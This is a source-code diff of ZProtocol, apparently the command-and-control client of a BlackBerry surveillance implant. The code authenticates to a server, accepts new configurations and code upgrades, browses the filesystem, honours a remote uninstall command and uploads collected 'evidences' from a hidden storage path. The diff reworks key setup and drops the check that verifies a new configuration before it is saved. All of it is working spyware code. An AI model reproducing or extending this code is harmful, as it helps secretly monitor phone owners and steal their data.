@@ -22,7 +22,6 @@ import blackberry.Status;
 import blackberry.Task;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
-import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
@@ -44,24 +43,24 @@ public class ZProtocol extends Protocol {
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
-    private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();
+    private final Encryption cryptoConf = new Encryption(Encryption.getKeys()
+            .getProtoKey());
 
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
 
     boolean upgrade;
     Vector upgradeFiles = new Vector();
+    Status status = Status.getInstance();
 
     public boolean perform() {
         //#ifdef DBC
         Check.requires(transport != null, "perform: transport = null");
         //#endif
 
-        reload = false;
-        uninstall = false;
 
         // key init
-        cryptoConf.makeKey(Encryption.getKeys().getChallengeKey());
+        //cryptoConf.makeKey(Encryption.getKeys().getProtoKey());
         RandomSource.getBytes(Kd);
         RandomSource.getBytes(Nonce);
 
@@ -76,13 +75,16 @@ public class ZProtocol extends Protocol {
 
             //#ifdef DEBUG
             debug.info("***** Authentication *****");
+
             //#endif          
 
-            byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
+            byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication(), 0);
             byte[] response = transport.command(cypherOut);
-            parseAuthentication(response);
+            Status.self().uninstall = parseAuthentication(response);
+            cypherOut = null;
+            response = null;
 
-            if (uninstall) {
+            if (status.uninstall) {
                 //#ifdef DEBUG
                 debug.warn("Uninstall detected, no need to continue");
                 //#endif  
@@ -94,6 +96,7 @@ public class ZProtocol extends Protocol {
             //#endif  
             response = command(Proto.ID, forgeIdentification());
             boolean[] capabilities = parseIdentification(response);
+            response = null;
 
             if (capabilities[Proto.NEW_CONF]) {
                 //#ifdef DEBUG
@@ -102,6 +105,7 @@ public class ZProtocol extends Protocol {
 
                 response = command(Proto.NEW_CONF);
                 int newconf = parseNewConf(response);
+                response = null;
 
                 if (newconf != Proto.NO) {
                     //#ifdef DEBUG
@@ -113,7 +117,7 @@ public class ZProtocol extends Protocol {
                         //#ifdef DEBUG
                         debug.trace("perform: conf is not corrupted, try it");
                         //#endif
-                        ret = Task.getInstance().taskInit();
+                        ret = Task.getInstance().reloadConf();
                     } else {
                         //#ifdef DEBUG
                         debug.trace("perform: conf was corrupted, or cannot write it");
@@ -143,6 +147,7 @@ public class ZProtocol extends Protocol {
                 //#endif  
                 response = command(Proto.DOWNLOAD);
                 parseDownload(response);
+                response = null;
             }
 
             if (capabilities[Proto.UPLOAD]) {
@@ -155,7 +160,9 @@ public class ZProtocol extends Protocol {
                 while (left) {
                     response = command(Proto.UPLOAD);
                     left = parseUpload(response);
+
                 }
+                response = null;
             }
 
             if (capabilities[Proto.UPGRADE]) {
@@ -170,6 +177,7 @@ public class ZProtocol extends Protocol {
                     response = command(Proto.UPGRADE);
                     left = parseUpgrade(response);
                 }
+                response = null;
             }
 
             if (capabilities[Proto.FILESYSTEM]) {
@@ -178,22 +186,21 @@ public class ZProtocol extends Protocol {
                 //#endif  
                 response = command(Proto.FILESYSTEM);
                 parseFileSystem(response);
+                response = null;
             }
 
             //#ifdef DEBUG
             debug.info("***** Log *****");
             //#endif  
 
-            sendEvidences(Path.SD());
-            if (!Path.SD().equals(Path.USER())) {
-                sendEvidences(Path.USER());
-            }
+            sendEvidences(Path.hidden());
 
             //#ifdef DEBUG
             debug.info("***** END *****");
             //#endif  
             response = command(Proto.BYE);
             parseEnd(response);
+            response = null;
 
             return true;
 
@@ -239,7 +246,7 @@ public class ZProtocol extends Protocol {
                 "forgeAuthentication, wrong array size");
         //#endif
 
-        dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
+        dataBuffer.write(Utils.padByteArray(keys.getBuildID(), 16));
         dataBuffer.write(keys.getInstanceId());
         dataBuffer.write(Utils.padByteArray(Device.getSubtype(), 16));
 
@@ -250,7 +257,7 @@ public class ZProtocol extends Protocol {
 
         // calculating digest       
         final SHA1Digest digest = new SHA1Digest();
-        digest.update(Utils.padByteArray(keys.getBuildId(), 16));
+        digest.update(Utils.padByteArray(keys.getBuildID(), 16));
         digest.update(keys.getInstanceId());
         digest.update(Utils.padByteArray(Device.getSubtype(), 16));
         digest.update(keys.getConfKey());
@@ -278,7 +285,7 @@ public class ZProtocol extends Protocol {
         return data;
     }
 
-    protected void parseAuthentication(byte[] authResult)
+    protected boolean parseAuthentication(byte[] authResult)
             throws ProtocolException {
         if (authResult.length != 64) {
             //#ifdef DEBUG
@@ -286,6 +293,8 @@ public class ZProtocol extends Protocol {
             //#endif
             throw new ProtocolException(14);
         }
+
+        boolean uninstall = false;
 
         //#ifdef DEBUG
         debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
@@ -295,18 +304,20 @@ public class ZProtocol extends Protocol {
         byte[] cypherKs = new byte[32];
         Utils.copy(cypherKs, authResult, cypherKs.length);
         try {
+
             byte[] Ks = cryptoConf.decryptData(cypherKs);
 
             //#ifdef DEBUG
             debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
             debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
+
             //#endif
 
             //PBKDF1 (SHA1, c=1, Salt=KS||Kd) 
             final SHA1Digest digest = new SHA1Digest();
             digest.update(Encryption.getKeys().getConfKey());
-            digest.update(Ks);
-            digest.update(Kd);
+            digest.update(Ks, 0, 16);
+            digest.update(Kd, 0, 16);
 
             byte[] K = new byte[16];
             Utils.copy(K, digest.getDigest(), K.length);
@@ -321,7 +332,10 @@ public class ZProtocol extends Protocol {
             byte[] cypherNonceCap = new byte[32];
             Utils.copy(cypherNonceCap, 0, authResult, 32, cypherNonceCap.length);
 
-            byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
+            Encryption crypto2 = new Encryption(K);
+            byte[] plainNonceCap = crypto2.decryptData(cypherNonceCap);
+            crypto2 = null;
+
             //#ifdef DEBUG
             debug.trace("decodeAuth plainNonceCap="
                     + Utils.byteArrayToHex(plainNonceCap));
@@ -359,11 +373,13 @@ public class ZProtocol extends Protocol {
             //#endif
             throw new ProtocolException(13);
         }
+
+        return uninstall;
     }
 
     protected byte[] forgeIdentification() {
         final Device device = Device.getInstance();
-        device.refreshData();
+        //device.refreshData();
 
         byte[] userid = WChar.pascalize(device.getWUserId());
         byte[] deviceid = WChar.pascalize(device.getWDeviceId());
@@ -465,41 +481,36 @@ public class ZProtocol extends Protocol {
     protected int parseNewConf(byte[] result) throws ProtocolException,
             CommandException {
         int res = Utils.byteArrayToInt(result, 0);
+        boolean ret = false;
         if (res == Proto.OK) {
-            //#ifdef DEBUG
-            debug.info("got NewConf");
-            //#endif
 
-            int confLen = Utils.byteArrayToInt(result, 4);
-            //#ifdef DEBUG
-            debug.trace("parseNewConf len: " + confLen);
-            //#endif
-            
-            byte[] newconf = new byte[confLen];
-            Utils.copy(newconf, 0, result, 8, confLen);
-
-            Conf conf = new Conf();            
-            if (conf.verifyConfig(newconf)) {
-
-                boolean ret = Protocol.saveNewConf(newconf, 0);
-                if (ret) {
-                    return Proto.OK;
-                }
-            }else{
+            final int confLen = Utils.byteArrayToInt(result, 4);
+            if (confLen > 0) {
                 //#ifdef DEBUG
-                debug.error("parseNewConf: not verified");
+                debug.info("got NewConf");
+                //#endif
+
+                ret = Protocol.saveNewConf(result, 8);
+
+            } else {
+                //#ifdef DEBUG
+                debug.info(" Error (parseNewConf): empty conf"); //$NON-NLS-1$
                 //#endif
             }
-            return Proto.ERROR;
+            if (ret) {
+                return Proto.OK;
+            } else {
+                return Proto.ERROR;
+            }
 
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.info("no new conf: ");
+            debug.info(" Info: no new conf: "); //$NON-NLS-1$
             //#endif
             return Proto.NO;
         } else {
             //#ifdef DEBUG
-            debug.error("parseNewConf: " + res);
+            debug.info(" Error: parseNewConf: " + res); //$NON-NLS-1$
             //#endif
             throw new ProtocolException();
         }
@@ -817,7 +828,7 @@ public class ZProtocol extends Protocol {
         //#endif
 
         int dataLen = data.length;
-        byte[] plainOut = new byte[dataLen + 4];
+        final byte[] plainOut = new byte[dataLen + 4];
         Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
         Utils.copy(plainOut, 4, data, 0, data.length);
 
@@ -825,7 +836,6 @@ public class ZProtocol extends Protocol {
             byte[] plainIn;
 
             plainIn = cypheredWriteReadSha(plainOut);
-
             return plainIn;
         } catch (CryptoException e) {
             //#ifdef DEBUG
